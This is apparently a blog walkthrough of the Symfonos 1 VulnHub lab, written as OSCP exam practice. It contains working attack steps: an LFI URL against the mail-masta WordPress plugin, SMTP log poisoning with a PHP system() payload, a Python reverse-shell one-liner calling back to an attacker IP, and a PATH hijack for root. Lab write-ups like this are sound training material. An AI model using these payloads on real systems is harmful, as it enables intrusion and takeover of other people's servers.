Preparing for the OSCP examination so am going after OSCP like machines to improve on my enumeration skills and exploitation don't want to miss anything on the day of the exam XD feel free to jump in [Download Symfonos 1 Here](https://www.vulnhub.com/entry/symfonos-1,322/) .

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oA nmap/allports -v IP
```

```

```

Now that is more better we some interesting ports to look into but let start with the enumeration of SMB since it the low hanging fruit now let see what we can loot on it.

```
â”Œâ”€â”€(muzecã‰¿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
â””â”€$ smbclient -L //172.16.109.132/ -N

```
Now seems we have anonymous share which we can be access with no credentilas let try it.

```
â”Œâ”€â”€(muzecã‰¿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
â””â”€$ smbclient  //172.16.109.132/anonymous -N

Seems we got a txt file let download it to our attacking machine. And see what we have.

```
                                                                                                                                                                       
â”Œâ”€â”€(muzecã‰¿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
â””â”€$ cat attention.txt  

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```

Now that is interesting if i remember clearly we still have a share owned by `helios` let try using the password we got now to see if user `helios` also fall victim of using weak password.

Boom we hit the bull eye `helios` password is `qwerty` now let get the files.

```
â”Œâ”€â”€(muzecã‰¿Muzec-Security)-[~/Documents/Vulnhubs/symfonos1]
â””â”€$ cat research.txt todo.txt
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.

1. Binge watch Dexter
2. Dance
3. Work on /h3l105

```

Now i `cat` both files and seems we found a hidden directory let try accessing it.

![image](https://user-images.githubusercontent.com/69868171/156554843-ef0c9058-702f-444c-9f98-c9e555166207.png)

Now that is interesting seems we re dealing with wordpress we can easily use `wpscan` to enumerate it more .

```
wpscan --url http://symfonos.local/h3l105/ --plugins-detection passive
```

```

Now that is interesting look go through the plugins we just found.

![image](https://user-images.githubusercontent.com/69868171/156556885-c868fafe-979f-4e61-aee7-d9f4cd22935d.png)

Now that is some old plugins let do research on it if it vulnerable.

![image](https://user-images.githubusercontent.com/69868171/156559316-31261f83-64f1-4b79-9ee5-53d22e20f67b.png)

![image](https://user-images.githubusercontent.com/69868171/156559913-2c08c778-bb0e-49d0-aa9c-f44a15d1c3a8.png)

Boom seems both is vulnerable to LFI the first thing is first that come to my mind is to check for the `wp-config.php` . But was able to use the mail masta LFI to read the config file.

```
http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

![image](https://user-images.githubusercontent.com/69868171/156565106-05891722-551c-48d9-a00d-e1b32e11f5f8.png)

![image](https://user-images.githubusercontent.com/69868171/156565678-776bfbf9-3c1e-452a-8d93-3e0df2fef0a5.png)

But seems after decoding it and getting the config.php file it not that useful back to our nmap scan to try something else apache log poisoning, SSH log poisoning no luck but we still have a port to try for log poisoning which is SMTP let give it a try.

![image](https://user-images.githubusercontent.com/69868171/156567326-6294bde3-b71e-435f-9cbf-8302bc5f6d18.png)

```
MAIL FROM:<Muzec@hacker.com>
RCPT TO:<?php system($_GET['cmd']); ?>
```

Note: We can ignore the 501 5.1.3 Bad recipient address syntax server response as seen in the above screenshot because ideally the internal email program of the server (victim machine), is expecting us to input an email ID and not the OS commands.

```
http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
```

Now we can see the logs.

![image](https://user-images.githubusercontent.com/69868171/156567980-17821be5-cd69-44b2-b6db-8633fe23ee49.png)

Now let try to execute a command.

```
http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id
```

![image](https://user-images.githubusercontent.com/69868171/156568137-a02a6026-f64c-4d9e-a05f-2460f95b72df.png)

Now we have RCE let get a reverse shell back to our terminal using `python` .

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.109.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image](https://user-images.githubusercontent.com/69868171/156568519-230adccd-d180-41fb-bb4b-472e13143a53.png)

Now let spawn a full TTY shell.

```
python -c 'import pty; pty.spawn ("/bin/bash")'
Ctrl Z
stty raw -echo;fg
Enter
stty rows 21 cols 210
export TERM=xterm-256color
```

Now seems it running `curl` and the full path is not specify it possible to hijack it which is the path variable we can create our own `curl` and add it to the path.

```
helios@symfonos:/tmp$ echo "/bin/sh" > curl
helios@symfonos:/tmp$ chmod 777 curl
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
helios@symfonos:/tmp$ /opt/statuscheck
```
